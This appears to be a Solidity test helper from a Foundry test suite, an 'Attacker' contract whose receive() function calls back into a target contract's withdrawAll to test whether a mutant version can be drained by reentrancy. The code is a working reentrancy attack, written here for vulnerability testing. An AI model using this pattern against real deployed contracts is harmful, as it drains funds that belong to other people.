// minimal adversarial helper that can reenter into C during receive()
contract Attacker {
    address payable public target;
    bool public willReenter;

    constructor(address _target) {
        target = payable(_target);
    }

    function setWillReenter(bool v) public {
        willReenter = v;
    }

    // deposit was already done directly by this contract's address (see test using vm.prank to fund it)
    function doWithdrawAll() public {
        // call withdrawAll from this contract so that the low-level call from C reaches this contract
        C(target).withdrawAll();
    }

    receive() external payable {
        if (willReenter) {
            // attempt to reenter withdrawAll once more; if the target is the mutant this may succeed
            // and further drain the contract balance
            // Use a low gas stipend to resemble a realistic reentry attempt; still allow the call
            (bool s, ) = target.call(abi.encodeWithSelector(C.withdrawAll.selector));
            // ignore result
            s;
        }
    }
}

